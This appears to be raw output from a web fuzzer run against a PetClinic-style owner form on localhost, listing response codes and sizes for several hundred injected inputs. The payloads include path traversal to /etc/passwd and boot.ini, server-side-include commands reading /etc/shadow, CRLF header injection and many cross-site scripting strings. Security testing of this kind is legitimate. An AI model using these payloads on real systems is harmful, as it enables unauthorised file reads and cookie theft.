Target: http://localhost:8080/owners/new?firstName=FUZZ&lastName=FUZZ&address=FUZZ&city=FUZZ&telephone=FUZZ
Total requests: 468
==================================================================
ID    Response   Lines      Word         Chars          Request    
==================================================================
00028:  C=400     11 L	     136 W	   2206 Ch	  "\0\0\0 - \0\0\0 - \0\0\0 - \0\0\0 - \0\0\0"
00095:  C=200    174 L	     307 W	   5129 Ch	  "/../../../../../../../../../../../etc/passwd%00.jpg - /../../../../../../../../../../../etc/passwd%00.jpg - /../../../../../../../../../../../etc/passwd%00.jpg - /../../../../../../../../../../../etc/passwd%00.jpg - /../../../../../../../../../../../etc/passwd%00.jpg"
00117:  C=200    174 L	     307 W	   5129 Ch	  "../../../../../../../../../../../../boot.ini - ../../../../../../../../../../../../boot.ini - ../../../../../../../../../../../../boot.ini - ../../../../../../../../../../../../boot.ini - ../../../../../../../../../../../../boot.ini"
00119:  C=200    174 L	     307 W	   5129 Ch	  "/../../../../../../../../../../../boot.ini%00 - /../../../../../../../../../../../boot.ini%00 - /../../../../../../../../../../../boot.ini%00 - /../../../../../../../../../../../boot.ini%00 - /../../../../../../../../../../../boot.ini%00"
00143:  C=400     11 L	     136 W	   2156 Ch	  "\ - \ - \ - \ - \"
00145:  C=400     11 L	     136 W	   2216 Ch	  "\\/ - \\/ - \\/ - \\/ - \\/"
00131:  C=200    174 L	     307 W	   5129 Ch	  "%0d%0aX-Injection-Header:%20AttackValue - %0d%0aX-Injection-Header:%20AttackValue - %0d%0aX-Injection-Header:%20AttackValue - %0d%0aX-Injection-Header:%20AttackValue - %0d%0aX-Injection-Header:%20AttackValue"
00147:  C=400     11 L	     136 W	   2216 Ch	  "\\\\?\\ - \\\\?\\ - \\\\?\\ - \\\\?\\ - \\\\?\\"
00144:  C=400     11 L	     136 W	   2166 Ch	  "\\ - \\ - \\ - \\ - \\"
00140:  C=400     11 L	     136 W	   2156 Ch	  "} - } - } - } - }"
00142:  C=200    174 L	     307 W	   5129 Ch	  "/ - / - / - / - /"
00139:  C=200    174 L	     307 W	   5129 Ch	  "* - * - * - * - *"
00141:  C=200    174 L	     307 W	   5129 Ch	  "; - ; - ; - ; - ;"
00138:  C=200    174 L	     307 W	   5129 Ch	  "# - # - # - # - #"
00137:  C=200    174 L	     307 W	   5129 Ch	  "% - % - % - % - %"
00133:  C=200    174 L	     307 W	   5129 Ch	  "%01%02%03%04%0a%0d%0aADSF - %01%02%03%04%0a%0d%0aADSF - %01%02%03%04%0a%0d%0aADSF - %01%02%03%04%0a%0d%0aADSF - %01%02%03%04%0a%0d%0aADSF"
00136:  C=200    174 L	     307 W	   5129 Ch	  "&lt;!--#exec%20cmd=&quot;/bin/cat%20/etc/shadow&quot;--&gt; - &lt;!--#exec%20cmd=&quot;/bin/cat%20/etc/shadow&quot;--&gt; - &lt;!--#exec%20cmd=&quot;/bin/cat%20/etc/shadow&quot;--&gt; - &lt;!--#exec%20cmd=&quot;/bin/cat%20/etc/shadow&quot;--&gt; - &lt;!--#exec%20cmd=&quot;/bin/cat%20/etc/shadow&quot;--&gt;"
00135:  C=200    174 L	     307 W	   5129 Ch	  "&lt;!--#exec%20cmd=&quot;/bin/cat%20/etc/passwd&quot;--&gt; - &lt;!--#exec%20cmd=&quot;/bin/cat%20/etc/passwd&quot;--&gt; - &lt;!--#exec%20cmd=&quot;/bin/cat%20/etc/passwd&quot;--&gt; - &lt;!--#exec%20cmd=&quot;/bin/cat%20/etc/passwd&quot;--&gt; - &lt;!--#exec%20cmd=&quot;/bin/cat%20/etc/passwd&quot;--&gt;"
00134:  C=200    174 L	     307 W	   5129 Ch	  "/,%ENV,/ - /,%ENV,/ - /,%ENV,/ - /,%ENV,/ - /,%ENV,/"
00130:  C=200    174 L	     307 W	   5129 Ch	  "/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/boot.ini - /%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/boot.ini - /%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/boot.ini - /%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/boot.ini - /%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/boot.ini"
00132:  C=200    174 L	     307 W	   5129 Ch	  "!@#0%^#0##018387@#0^^**(() - !@#0%^#0##018387@#0^^**(() - !@#0%^#0##018387@#0^^**(() - !@#0%^#0##018387@#0^^**(() - !@#0%^#0##018387@#0^^**(()"
00129:  C=200    174 L	     307 W	   5129 Ch	  "..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../boot.ini - ..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../boot.ini - ..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../boot.ini - ..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../boot.ini - ..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../boot.ini"
00128:  C=200    174 L	     307 W	   5129 Ch	  "/.../.../.../.../.../ - /.../.../.../.../.../ - /.../.../.../.../.../ - /.../.../.../.../.../ - /.../.../.../.../.../"
00125:  C=400     11 L	     136 W	   2526 Ch	  "..\..\..\..\..\..\..\..\..\..\boot.ini - ..\..\..\..\..\..\..\..\..\..\boot.ini - ..\..\..\..\..\..\..\..\..\..\boot.ini - ..\..\..\..\..\..\..\..\..\..\boot.ini - ..\..\..\..\..\..\..\..\..\..\boot.ini"
00127:  C=200    174 L	     307 W	   5129 Ch	  "/../../../../../../../../../../../boot.ini%00.jpg - /../../../../../../../../../../../boot.ini%00.jpg - /../../../../../../../../../../../boot.ini%00.jpg - /../../../../../../../../../../../boot.ini%00.jpg - /../../../../../../../../../../../boot.ini%00.jpg"
00122:  C=400     11 L	     136 W	   2816 Ch	  "/.\\./.\\./.\\./.\\./.\\./.\\./boot.ini - /.\\./.\\./.\\./.\\./.\\./.\\./boot.ini - /.\\./.\\./.\\./.\\./.\\./.\\./boot.ini - /.\\./.\\./.\\./.\\./.\\./.\\./boot.ini - /.\\./.\\./.\\./.\\./.\\./.\\./boot.ini"
00124:  C=400     11 L	     136 W	   2556 Ch	  "..\..\..\..\..\..\..\..\..\..\boot.ini%00 - ..\..\..\..\..\..\..\..\..\..\boot.ini%00 - ..\..\..\..\..\..\..\..\..\..\boot.ini%00 - ..\..\..\..\..\..\..\..\..\..\boot.ini%00 - ..\..\..\..\..\..\..\..\..\..\boot.ini%00"
00121:  C=400     11 L	     136 W	   2876 Ch	  "/..\../..\../..\../..\../..\../..\../boot.ini - /..\../..\../..\../..\../..\../..\../boot.ini - /..\../..\../..\../..\../..\../..\../boot.ini - /..\../..\../..\../..\../..\../..\../boot.ini - /..\../..\../..\../..\../..\../..\../boot.ini"
00126:  C=200    174 L	     307 W	   5129 Ch	  "/../../../../../../../../../../../boot.ini%00.html - /../../../../../../../../../../../boot.ini%00.html - /../../../../../../../../../../../boot.ini%00.html - /../../../../../../../../../../../boot.ini%00.html - /../../../../../../../../../../../boot.ini%00.html"
00154:  C=400     11 L	     136 W	   2266 Ch	  "<<< - <<< - <<< - <<< - <<<"
00118:  C=200    174 L	     307 W	   5129 Ch	  "/./././././././././././boot.ini - /./././././././././././boot.ini - /./././././././././././boot.ini - /./././././././././././boot.ini - /./././././././././././boot.ini"
00162:  C=400     11 L	     136 W	   2206 Ch	  "\' - \' - \' - \' - \'"
00120:  C=200    174 L	     307 W	   5129 Ch	  "/../../../../../../../../../../../boot.ini - /../../../../../../../../../../../boot.ini - /../../../../../../../../../../../boot.ini - /../../../../../../../../../../../boot.ini - /../../../../../../../../../../../boot.ini"
00148:  C=200    174 L	     307 W	   5129 Ch	  "&lt - &lt - &lt - &lt - &lt"
00150:  C=200    174 L	     307 W	   5129 Ch	  "&LT - &LT - &LT - &LT - &LT"
00197:  C=200    174 L	     307 W	   5129 Ch	  "%20 - %20 - %20 - %20 - %20"
00178:  C=200    174 L	     307 W	   5129 Ch	  "&#13;&#10; - &#13;&#10; - &#13;&#10; - &#13;&#10; - &#13;&#10;"
00196:  C=200    174 L	     307 W	   5129 Ch	  "%2C - %2C - %2C - %2C - %2C"
00195:  C=200    174 L	     307 W	   5129 Ch	  "%2A - %2A - %2A - %2A - %2A"
00192:  C=200    174 L	     307 W	   5129 Ch	  "%7C - %7C - %7C - %7C - %7C"
00194:  C=200    174 L	     307 W	   5129 Ch	  "/%2A - /%2A - /%2A - /%2A - /%2A"
00193:  C=200    174 L	     307 W	   5129 Ch	  "%00 - %00 - %00 - %00 - %00"
00191:  C=200    174 L	     307 W	   5129 Ch	  "%5C/ - %5C/ - %5C/ - %5C/ - %5C/"
00186:  C=400     11 L	     136 W	   2196 Ch	  "<? - <? - <? - <? - <?"
00189:  C=200    174 L	     307 W	   5129 Ch	  "%60 - %60 - %60 - %60 - %60"
00190:  C=200    174 L	     307 W	   5129 Ch	  "%5C - %5C - %5C - %5C - %5C"
00188:  C=200    174 L	     307 W	   5129 Ch	  "%3C%3F - %3C%3F - %3C%3F - %3C%3F - %3C%3F"
00187:  C=200    174 L	     307 W	   5129 Ch	  "%3C - %3C - %3C - %3C - %3C"
00185:  C=200    174 L	     307 W	   5129 Ch	  "%00 - %00 - %00 - %00 - %00"
00174:  C=400     11 L	     136 W	   2286 Ch	  ""\t" - "\t" - "\t" - "\t" - "\t""
00184:  C=200    174 L	     307 W	   5129 Ch	  "%00/ - %00/ - %00/ - %00/ - %00/"
00173:  C=400     11 L	     136 W	   2166 Ch	  "\t - \t - \t - \t - \t"
00180:  C=200    174 L	     307 W	   5129 Ch	  "#xA - #xA - #xA - #xA - #xA"
00181:  C=200    174 L	     307 W	   5129 Ch	  "#xD#xA - #xD#xA - #xD#xA - #xD#xA - #xD#xA"
00183:  C=200    174 L	     307 W	   5129 Ch	  "/%00/ - /%00/ - /%00/ - /%00/ - /%00/"
00182:  C=200    174 L	     307 W	   5129 Ch	  "#xA#xD - #xA#xD - #xA#xD - #xA#xD - #xA#xD"
00177:  C=200    174 L	     307 W	   5129 Ch	  "&#10;&#13; - &#10;&#13; - &#10;&#13; - &#10;&#13; - &#10;&#13;"
00179:  C=200    174 L	     307 W	   5129 Ch	  "#xD - #xD - #xD - #xD - #xD"
00176:  C=200    174 L	     307 W	   5129 Ch	  "&#13; - &#13; - &#13; - &#13; - &#13;"
00175:  C=200    174 L	     307 W	   5129 Ch	  "&#10; - &#10; - &#10; - &#10; - &#10;"
00167:  C=400     11 L	     136 W	   2216 Ch	  "['] - ['] - ['] - ['] - [']"
00166:  C=400     11 L	     136 W	   2216 Ch	  "{'} - {'} - {'} - {'} - {'}"
00172:  C=200    174 L	     307 W	   5129 Ch	  "%01%02%03%04%0a%0d%0aADSF - %01%02%03%04%0a%0d%0aADSF - %01%02%03%04%0a%0d%0aADSF - %01%02%03%04%0a%0d%0aADSF - %01%02%03%04%0a%0d%0aADSF"
00171:  C=200    174 L	     307 W	   5129 Ch	  "!@#$%%^#$%#$@#$%$$@#$%^^**(() - !@#$%%^#$%#$@#$%$$@#$%^^**(() - !@#$%%^#$%#$@#$%$$@#$%^^**(() - !@#$%%^#$%#$@#$%$$@#$%^^**(() - !@#$%%^#$%#$@#$%$$@#$%^^**(()"
00170:  C=200    174 L	     307 W	   5129 Ch	  "!' - !' - !' - !' - !'"
00169:  C=200    174 L	     307 W	   5129 Ch	  "#' - #' - #' - #' - #'"
00161:  C=400     11 L	     136 W	   2206 Ch	  "^' - ^' - ^' - ^' - ^'"
00160:  C=400     11 L	     136 W	   2166 Ch	  "*| - *| - *| - *| - *|"
00168:  C=200    174 L	     307 W	   5129 Ch	  "*' - *' - *' - *' - *'"
00165:  C=200    174 L	     307 W	   5129 Ch	  "(') - (') - (') - (') - (')"
00164:  C=200    174 L	     307 W	   5129 Ch	  "@' - @' - @' - @' - @'"
00157:  C=400     11 L	     136 W	   2156 Ch	  "` - ` - ` - ` - `"
00156:  C=400     11 L	     136 W	   2166 Ch	  "|| - || - || - || - ||"
00163:  C=200    174 L	     307 W	   5129 Ch	  "/' - /' - /' - /' - /'"
00153:  C=400     11 L	     136 W	   2226 Ch	  "<< - << - << - << - <<"
00155:  C=400     11 L	     136 W	   2156 Ch	  "| - | - | - | - |"
00152:  C=400     11 L	     136 W	   2186 Ch	  "< - < - < - < - <"
00159:  C=200    174 L	     307 W	   5129 Ch	  "-- - -- - -- - -- - --"
00158:  C=200    174 L	     307 W	   5129 Ch	  "- - - - - - - - -"
00198:  C=400     11 L	     136 W	   2186 Ch	  "%20| - %20| - %20| - %20| - %20|"
00149:  C=200    174 L	     307 W	   5129 Ch	  "&lt; - &lt; - &lt; - &lt; - &lt;"
00151:  C=200    174 L	     307 W	   5129 Ch	  "&LT; - &LT; - &LT; - &LT; - &LT;"
00200:  C=200    174 L	     307 W	   5129 Ch	  "%2500 - %2500 - %2500 - %2500 - %2500"
00204:  C=200    174 L	     307 W	   5129 Ch	  "..%c0%af - ..%c0%af - ..%c0%af - ..%c0%af - ..%c0%af"
00212:  C=200    174 L	     307 W	   5129 Ch	  "..%u2216 - ..%u2216 - ..%u2216 - ..%u2216 - ..%u2216"
00214:  C=200    174 L	     307 W	   5129 Ch	  "&#060 - &#060 - &#060 - &#060 - &#060"
00211:  C=200    174 L	     307 W	   5129 Ch	  "..%25%35%63 - ..%25%35%63 - ..%25%35%63 - ..%25%35%63 - ..%25%35%63"
00209:  C=200    174 L	     307 W	   5129 Ch	  "..%255c - ..%255c - ..%255c - ..%255c - ..%255c"
00213:  C=200    174 L	     307 W	   5129 Ch	  "&#60 - &#60 - &#60 - &#60 - &#60"
00210:  C=200    174 L	     307 W	   5129 Ch	  "..%%35%63 - ..%%35%63 - ..%%35%63 - ..%%35%63 - ..%%35%63"
00208:  C=200    174 L	     307 W	   5129 Ch	  "..%%35c - ..%%35c - ..%%35c - ..%%35c - ..%%35c"
00206:  C=400     11 L	     136 W	   2176 Ch	  "..\ - ..\ - ..\ - ..\ - ..\"
00207:  C=200    174 L	     307 W	   5129 Ch	  "..%5c - ..%5c - ..%5c - ..%5c - ..%5c"
00203:  C=200    174 L	     307 W	   5129 Ch	  "..%u2215 - ..%u2215 - ..%u2215 - ..%u2215 - ..%u2215"
00205:  C=200    174 L	     307 W	   5129 Ch	  "..%bg%qf - ..%bg%qf - ..%bg%qf - ..%bg%qf - ..%bg%qf"
00202:  C=200    174 L	     307 W	   5129 Ch	  "%2e%2e%2f - %2e%2e%2f - %2e%2e%2f - %2e%2e%2f - %2e%2e%2f"
00199:  C=200    174 L	     307 W	   5129 Ch	  "%250a - %250a - %250a - %250a - %250a"
00201:  C=200    174 L	     307 W	   5129 Ch	  "../ - ../ - ../ - ../ - ../"
00215:  C=200    174 L	     307 W	   5129 Ch	  "&#0060 - &#0060 - &#0060 - &#0060 - &#0060"
00217:  C=200    174 L	     307 W	   5129 Ch	  "&#000060 - &#000060 - &#000060 - &#000060 - &#000060"
00221:  C=200    174 L	     307 W	   5129 Ch	  "&#0060; - &#0060; - &#0060; - &#0060; - &#0060;"
00228:  C=200    174 L	     307 W	   5129 Ch	  "&#x0003c - &#x0003c - &#x0003c - &#x0003c - &#x0003c"
00227:  C=200    174 L	     307 W	   5129 Ch	  "&#x003c - &#x003c - &#x003c - &#x003c - &#x003c"
00226:  C=200    174 L	     307 W	   5129 Ch	  "&#x03c - &#x03c - &#x03c - &#x03c - &#x03c"
00225:  C=200    174 L	     307 W	   5129 Ch	  "&#x3c - &#x3c - &#x3c - &#x3c - &#x3c"
00224:  C=200    174 L	     307 W	   5129 Ch	  "&#0000060; - &#0000060; - &#0000060; - &#0000060; - &#0000060;"
00220:  C=200    174 L	     307 W	   5129 Ch	  "&#060; - &#060; - &#060; - &#060; - &#060;"
00222:  C=200    174 L	     307 W	   5129 Ch	  "&#00060; - &#00060; - &#00060; - &#00060; - &#00060;"
00219:  C=200    174 L	     307 W	   5129 Ch	  "&#60; - &#60; - &#60; - &#60; - &#60;"
00223:  C=200    174 L	     307 W	   5129 Ch	  "&#000060; - &#000060; - &#000060; - &#000060; - &#000060;"
00216:  C=200    174 L	     307 W	   5129 Ch	  "&#00060 - &#00060 - &#00060 - &#00060 - &#00060"
00218:  C=200    174 L	     307 W	   5129 Ch	  "&#0000060 - &#0000060 - &#0000060 - &#0000060 - &#0000060"
00229:  C=200    174 L	     307 W	   5129 Ch	  "&#x00003c - &#x00003c - &#x00003c - &#x00003c - &#x00003c"
00231:  C=200    174 L	     307 W	   5129 Ch	  "&#x3c; - &#x3c; - &#x3c; - &#x3c; - &#x3c;"
00235:  C=200    174 L	     307 W	   5129 Ch	  "&#x00003c; - &#x00003c; - &#x00003c; - &#x00003c; - &#x00003c;"
00243:  C=200    174 L	     307 W	   5129 Ch	  "&#X3c; - &#X3c; - &#X3c; - &#X3c; - &#X3c;"
00245:  C=200    174 L	     307 W	   5129 Ch	  "&#X003c; - &#X003c; - &#X003c; - &#X003c; - &#X003c;"
00242:  C=200    174 L	     307 W	   5129 Ch	  "&#X000003c - &#X000003c - &#X000003c - &#X000003c - &#X000003c"
00244:  C=200    174 L	     307 W	   5129 Ch	  "&#X03c; - &#X03c; - &#X03c; - &#X03c; - &#X03c;"
00241:  C=200    174 L	     307 W	   5129 Ch	  "&#X00003c - &#X00003c - &#X00003c - &#X00003c - &#X00003c"
00240:  C=200    174 L	     307 W	   5129 Ch	  "&#X0003c - &#X0003c - &#X0003c - &#X0003c - &#X0003c"
00239:  C=200    174 L	     307 W	   5129 Ch	  "&#X003c - &#X003c - &#X003c - &#X003c - &#X003c"
00238:  C=200    174 L	     307 W	   5129 Ch	  "&#X03c - &#X03c - &#X03c - &#X03c - &#X03c"
00234:  C=200    174 L	     307 W	   5129 Ch	  "&#x0003c; - &#x0003c; - &#x0003c; - &#x0003c; - &#x0003c;"
00236:  C=200    174 L	     307 W	   5129 Ch	  "&#x000003c; - &#x000003c; - &#x000003c; - &#x000003c; - &#x000003c;"
00237:  C=200    174 L	     307 W	   5129 Ch	  "&#X3c - &#X3c - &#X3c - &#X3c - &#X3c"
00233:  C=200    174 L	     307 W	   5129 Ch	  "&#x003c; - &#x003c; - &#x003c; - &#x003c; - &#x003c;"
00230:  C=200    174 L	     307 W	   5129 Ch	  "&#x000003c - &#x000003c - &#x000003c - &#x000003c - &#x000003c"
00232:  C=200    174 L	     307 W	   5129 Ch	  "&#x03c; - &#x03c; - &#x03c; - &#x03c; - &#x03c;"
00246:  C=200    174 L	     307 W	   5129 Ch	  "&#X0003c; - &#X0003c; - &#X0003c; - &#X0003c; - &#X0003c;"
00248:  C=200    174 L	     307 W	   5129 Ch	  "&#X000003c; - &#X000003c; - &#X000003c; - &#X000003c; - &#X000003c;"
00252:  C=200    174 L	     307 W	   5129 Ch	  "&#x0003C - &#x0003C - &#x0003C - &#x0003C - &#x0003C"
00259:  C=200    174 L	     307 W	   5129 Ch	  "&#x00003C; - &#x00003C; - &#x00003C; - &#x00003C; - &#x00003C;"
00258:  C=200    174 L	     307 W	   5129 Ch	  "&#x0003C; - &#x0003C; - &#x0003C; - &#x0003C; - &#x0003C;"
00257:  C=200    174 L	     307 W	   5129 Ch	  "&#x003C; - &#x003C; - &#x003C; - &#x003C; - &#x003C;"
00256:  C=200    174 L	     307 W	   5129 Ch	  "&#x03C; - &#x03C; - &#x03C; - &#x03C; - &#x03C;"
00255:  C=200    174 L	     307 W	   5129 Ch	  "&#x3C; - &#x3C; - &#x3C; - &#x3C; - &#x3C;"
00254:  C=200    174 L	     307 W	   5129 Ch	  "&#x000003C - &#x000003C - &#x000003C - &#x000003C - &#x000003C"
00251:  C=200    174 L	     307 W	   5129 Ch	  "&#x003C - &#x003C - &#x003C - &#x003C - &#x003C"
00250:  C=200    174 L	     307 W	   5129 Ch	  "&#x03C - &#x03C - &#x03C - &#x03C - &#x03C"
00253:  C=200    174 L	     307 W	   5129 Ch	  "&#x00003C - &#x00003C - &#x00003C - &#x00003C - &#x00003C"
00247:  C=200    174 L	     307 W	   5129 Ch	  "&#X00003c; - &#X00003c; - &#X00003c; - &#X00003c; - &#X00003c;"
00249:  C=200    174 L	     307 W	   5129 Ch	  "&#x3C - &#x3C - &#x3C - &#x3C - &#x3C"
00260:  C=200    174 L	     307 W	   5129 Ch	  "&#x000003C; - &#x000003C; - &#x000003C; - &#x000003C; - &#x000003C;"
00262:  C=200    174 L	     307 W	   5129 Ch	  "&#X03C - &#X03C - &#X03C - &#X03C - &#X03C"
00267:  C=200    174 L	     307 W	   5129 Ch	  "&#X3C; - &#X3C; - &#X3C; - &#X3C; - &#X3C;"
00269:  C=200    174 L	     307 W	   5129 Ch	  "&#X003C; - &#X003C; - &#X003C; - &#X003C; - &#X003C;"
00268:  C=200    174 L	     307 W	   5129 Ch	  "&#X03C; - &#X03C; - &#X03C; - &#X03C; - &#X03C;"
00265:  C=200    174 L	     307 W	   5129 Ch	  "&#X00003C - &#X00003C - &#X00003C - &#X00003C - &#X00003C"
00266:  C=200    174 L	     307 W	   5129 Ch	  "&#X000003C - &#X000003C - &#X000003C - &#X000003C - &#X000003C"
00263:  C=200    174 L	     307 W	   5129 Ch	  "&#X003C - &#X003C - &#X003C - &#X003C - &#X003C"
00270:  C=200    174 L	     307 W	   5129 Ch	  "&#X0003C; - &#X0003C; - &#X0003C; - &#X0003C; - &#X0003C;"
00276:  C=400     11 L	     136 W	   2206 Ch	  "\u003C - \u003C - \u003C - \u003C - \u003C"
00264:  C=200    174 L	     307 W	   5129 Ch	  "&#X0003C - &#X0003C - &#X0003C - &#X0003C - &#X0003C"
00292:  C=400     11 L	     136 W	   2786 Ch	  "'><script>alert(document.cookie)</script> - '><script>alert(document.cookie)</script> - '><script>alert(document.cookie)</script> - '><script>alert(document.cookie)</script> - '><script>alert(document.cookie)</script>"
00293:  C=400     11 L	     136 W	   2796 Ch	  "'><script>alert(document.cookie);</script> - '><script>alert(document.cookie);</script> - '><script>alert(document.cookie);</script> - '><script>alert(document.cookie);</script> - '><script>alert(document.cookie);</script>"
00284:  C=400     11 L	     136 W	   2266 Ch	  "[&apos;] - [&apos;] - [&apos;] - [&apos;] - [&apos;]"
00261:  C=200    174 L	     307 W	   5129 Ch	  "&#X3C - &#X3C - &#X3C - &#X3C - &#X3C"
00272:  C=200    174 L	     307 W	   5129 Ch	  "&#X000003C; - &#X000003C; - &#X000003C; - &#X000003C; - &#X000003C;"
00291:  C=400     11 L	     136 W	   2696 Ch	  "<script>alert(document.cookie)</script> - <script>alert(document.cookie)</script> - <script>alert(document.cookie)</script> - <script>alert(document.cookie)</script> - <script>alert(document.cookie)</script>"
00290:  C=400     11 L	     136 W	   2886 Ch	  "<<script>alert("XSS");//<</script> - <<script>alert("XSS");//<</script> - <<script>alert("XSS");//<</script> - <<script>alert("XSS");//<</script> - <<script>alert("XSS");//<</script>"
00289:  C=400     11 L	     136 W	   2696 Ch	  "<script>alert("XSS")</script> - <script>alert("XSS")</script> - <script>alert("XSS")</script> - <script>alert("XSS")</script> - <script>alert("XSS")</script>"
00288:  C=400     11 L	     136 W	   2446 Ch	  ""><script>" - "><script>" - "><script>" - "><script>" - "><script>""
00287:  C=400     11 L	     136 W	   2396 Ch	  "">xxx<P>yyy - ">xxx<P>yyy - ">xxx<P>yyy - ">xxx<P>yyy - ">xxx<P>yyy"
00283:  C=400     11 L	     136 W	   2266 Ch	  "{&apos;} - {&apos;} - {&apos;} - {&apos;} - {&apos;}"
00281:  C=400     11 L	     136 W	   2256 Ch	  "^&apos; - ^&apos; - ^&apos; - ^&apos; - ^&apos;"
00280:  C=400     11 L	     136 W	   2256 Ch	  "\&apos; - \&apos; - \&apos; - \&apos; - \&apos;"
00275:  C=400     11 L	     136 W	   2206 Ch	  "\u003c - \u003c - \u003c - \u003c - \u003c"
00286:  C=200    174 L	     307 W	   5129 Ch	  "#&apos; - #&apos; - #&apos; - #&apos; - #&apos;"
00274:  C=400     11 L	     136 W	   2186 Ch	  "\x3C - \x3C - \x3C - \x3C - \x3C"
00273:  C=400     11 L	     136 W	   2186 Ch	  "\x3c - \x3c - \x3c - \x3c - \x3c"
00294:  C=400     11 L	     136 W	   2536 Ch	  "\";alert('XSS');// - \";alert('XSS');// - \";alert('XSS');// - \";alert('XSS');// - \";alert('XSS');//"
00285:  C=200    174 L	     307 W	   5129 Ch	  "*&apos; - *&apos; - *&apos; - *&apos; - *&apos;"
00282:  C=200    174 L	     307 W	   5129 Ch	  "@&apos; - @&apos; - @&apos; - @&apos; - @&apos;"
00300:  C=400     11 L	     136 W	   3016 Ch	  "<xss><script>alert('XSS')</script></vulnerable> - <xss><script>alert('XSS')</script></vulnerable> - <xss><script>alert('XSS')</script></vulnerable> - <xss><script>alert('XSS')</script></vulnerable> - <xss><script>alert('XSS')</script></vulnerable>"
00279:  C=200    174 L	     307 W	   5129 Ch	  "/&apos; - /&apos; - /&apos; - /&apos; - /&apos;"
00278:  C=200    174 L	     307 W	   5129 Ch	  "&apos; - &apos; - &apos; - &apos; - &apos;"
00308:  C=400     11 L	     136 W	   3116 Ch	  "<IMG """><SCRIPT>alert("XSS")</SCRIPT>"> - <IMG """><SCRIPT>alert("XSS")</SCRIPT>"> - <IMG """><SCRIPT>alert("XSS")</SCRIPT>"> - <IMG """><SCRIPT>alert("XSS")</SCRIPT>"> - <IMG """><SCRIPT>alert("XSS")</SCRIPT>">"
00307:  C=400     11 L	     136 W	   2776 Ch	  "<IMG SRC=`javascript:alert("'XSS'")`> - <IMG SRC=`javascript:alert("'XSS'")`> - <IMG SRC=`javascript:alert("'XSS'")`> - <IMG SRC=`javascript:alert("'XSS'")`> - <IMG SRC=`javascript:alert("'XSS'")`>"
00277:  C=200    174 L	     307 W	   5129 Ch	  "something%00html - something%00html - something%00html - something%00html - something%00html"
00305:  C=400     11 L	     136 W	   2636 Ch	  "<IMG SRC=JaVaScRiPt:alert('XSS')> - <IMG SRC=JaVaScRiPt:alert('XSS')> - <IMG SRC=JaVaScRiPt:alert('XSS')> - <IMG SRC=JaVaScRiPt:alert('XSS')> - <IMG SRC=JaVaScRiPt:alert('XSS')>"
00306:  C=400     11 L	     136 W	   2736 Ch	  "<IMG SRC=javascript:alert(&quot;XSS&quot;)> - <IMG SRC=javascript:alert(&quot;XSS&quot;)> - <IMG SRC=javascript:alert(&quot;XSS&quot;)> - <IMG SRC=javascript:alert(&quot;XSS&quot;)> - <IMG SRC=javascript:alert(&quot;XSS&quot;)>"
00309:  C=400     11 L	     136 W	   2796 Ch	  "<IMG SRC=javascript:alert(String.fromCharCode(88,83,83))> - <IMG SRC=javascript:alert(String.fromCharCode(88,83,83))> - <IMG SRC=javascript:alert(String.fromCharCode(88,83,83))> - <IMG SRC=javascript:alert(String.fromCharCode(88,83,83))> - <IMG SRC=javascript:alert(String.fromCharCode(88,83,83))>"
00271:  C=200    174 L	     307 W	   5129 Ch	  "&#X00003C; - &#X00003C; - &#X00003C; - &#X00003C; - &#X00003C;"
00296:  C=200    174 L	     307 W	   5129 Ch	  "%3cscript%3ealert(document.cookie);%3c%2fscript%3e - %3cscript%3ealert(document.cookie);%3c%2fscript%3e - %3cscript%3ealert(document.cookie);%3c%2fscript%3e - %3cscript%3ealert(document.cookie);%3c%2fscript%3e - %3cscript%3ealert(document.cookie);%3c%2fscript%3e"
